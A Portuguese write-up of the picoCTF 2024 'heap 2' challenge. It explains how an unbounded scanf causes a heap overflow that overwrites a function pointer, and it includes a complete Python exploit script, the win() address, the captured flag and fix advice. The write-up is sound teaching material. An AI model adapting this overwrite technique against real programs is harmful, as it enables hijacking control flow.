# heap 2

## Descrição do Desafio

**Plataforma:** [picoCTF — heap 2](https://learn.cylabacademy.org/library/435)  
**Autor da WriteUp:** Marcelo Agrico Guedes  
**Edição:** picoCTF 2024  
**Categoria:** Binary Exploitation  
**Vulnerabilidade:** Heap Buffer Overflow / desvio do fluxo de execução

O desafio apresenta um programa interativo desenvolvido em C que utiliza alocações na *heap*. Uma entrada sem limite de tamanho permite sobrescrever dados de uma segunda alocação. Neste desafio, o programa interpreta o conteúdo dessa região como um endereço de função. O objetivo é alterar esse endereço para executar `win()`, responsável por ler e imprimir a flag.

## Arquivos

* `chall.c` — código-fonte fornecido pela plataforma.
* `chall` — executável Linux do desafio.
* Instância oficial da CyLab Security Academy — serviço acessível por Netcat, com host e porta atribuídos à sessão.

Os arquivos do desafio não precisam ser incluídos neste repositório.

## Passo a Passo da Solução

### 1. Análise do arquivo fornecido

A análise do código-fonte revela a alocação de duas regiões de 5 bytes:

```c
input_data = malloc(5);
strncpy(input_data, "pico", 5);
x = malloc(5);
strncpy(x, "bico", 5);
```

A primeira região, `input_data`, recebe o texto digitado pelo usuário. A segunda, `x`, contém inicialmente `"bico"`. O menu apresenta as opções **1. Print Heap**, **2. Write to buffer**, **3. Print x**, **4. Print Flag** e **5. Exit**.

Na instância utilizada, o comando de conexão foi:

```bash
nc xebec.cylabacademy.net 43789
```

A opção **Print Heap** apresentou os seguintes endereços:

```text
[*]   Address   ->   Value
+-------------+-----------+
[*]   0xf5812b0  ->   pico
+-------------+-----------+
[*]   0xf5812d0  ->   bico
```

A distância entre as duas regiões é:

```text
0xf5812d0 - 0xf5812b0 = 0x20 = 32 bytes
```

Embora cada chamada a `malloc()` solicite apenas 5 bytes, as regiões aparecem separadas por 32 bytes nessa execução, devido à organização e ao alinhamento realizados pelo alocador. Essa distância deve ser medida em cada ambiente, pois não representa o tamanho útil de `input_data`.

A vulnerabilidade está na função `write_buffer()`:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Como `%s` não limita a quantidade de caracteres lidos, uma entrada longa pode ultrapassar os limites de `input_data` e atingir os bytes de `x`, caracterizando um **heap buffer overflow**.

A particularidade deste desafio está na função abaixo:

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

A expressão lê os primeiros **4 bytes** armazenados no endereço apontado por `x` (`*(int*)x`), interpreta esse valor como um endereço de função e realiza a chamada. Isso transforma uma corrupção de dados em uma possibilidade de desvio do fluxo de execução. Não se trata de alterar o próprio ponteiro `x`, mas sim **os bytes guardados na região para a qual ele aponta**.

O binário também contém `win()`, função que lê a flag de `flag.txt` e a imprime. Para identificar seu endereço no executável fornecido, foi utilizado:

```bash
nm ~/Downloads/chall | grep ' win$'
```

Resultado observado:

```text
00000000004011a0 T win
```

Portanto, o endereço de `win()` nesse binário é **`0x4011a0`**.

### 2. Exploit

Com base na análise, a solução consiste em escrever **32 bytes de preenchimento** para alcançar `x` e, em seguida, colocar ali o endereço de `win()` no formato *little-endian*.

Nesse formato, os bytes menos significativos do endereço são enviados primeiro. O endereço `0x4011a0` pode ser representado, em 64 bits, como:

```text
A0 11 40 00 00 00 00 00
```

Como `check_win()` lê os quatro primeiros bytes de `x` na versão analisada, são eles que determinam o endereço interpretado pela função. O programa original não verifica se esse valor aponta para uma função permitida.

O script abaixo reproduz a interação com a instância autorizada usando apenas bibliotecas padrão do Python:

```python
import socket
import struct

HOST = "xebec.cylabacademy.net"
PORT = 43789
WIN = 0x4011a0

payload = b"A" * 32 + struct.pack("<Q", WIN)

def receber_ate(conexao, texto):
    dados = b""
    while texto not in dados:
        bloco = conexao.recv(4096)
        if not bloco:
            raise ConnectionError("Conexão encerrada antes do esperado")
        dados += bloco
    return dados

with socket.create_connection((HOST, PORT), timeout=10) as conexao:
    receber_ate(conexao, b"Enter your choice:")
    conexao.sendall(b"2\n")

    receber_ate(conexao, b"Data for buffer:")
    conexao.sendall(payload + b"\n")

    receber_ate(conexao, b"Enter your choice:")
    conexao.sendall(b"4\n")

    while True:
        resposta = conexao.recv(4096)
        if not resposta:
            break
        print(resposta.decode(errors="replace"), end="")
```

O script seleciona **2. Write to buffer**, envia o preenchimento seguido do endereço de `win()` e depois seleciona **4. Print Flag**, que chama `check_win()`. O valor modificado em `x` faz essa chamada alcançar `win()`.

A flag informada após a execução na instância foi:

```text
academy{and_down_the_road_we_go_67bc01d6}
```

**Correção e prevenção.** A principal correção para o problema de entrada é limitar a leitura ao tamanho do buffer. Para uma área de 5 bytes:

```c
scanf("%4s", input_data);
```

Outra alternativa é usar `fgets(input_data, 5, stdin)`, com verificação do retorno e tratamento dos caracteres restantes na entrada. Além disso, uma aplicação não deve transformar dados mutáveis em um endereço executável sem validação. Testes com AddressSanitizer (`-fsanitize=address`) ajudam a identificar escritas fora da memória alocada. Mecanismos como ASLR e PIE podem dificultar ataques baseados em endereços conhecidos, mas não substituem a correção do overflow e o controle adequado do fluxo de execução.

## Flag

`academy{and_down_the_road_we_go_67bc01d6}`

## Autor da WriteUp

* Criado pela equipe **HawkSec Team**, em nome de **Marcelo Agrico Guedes**.

*Referências de estudo: [desafio na CyLab Security Academy](https://learn.cylabacademy.org/library/435) e [documentação técnica pública do heap 2](https://hackucf.org/writeups/heap-2). Os endereços e a flag registrados acima correspondem aos resultados informados para a instância utilizada.*
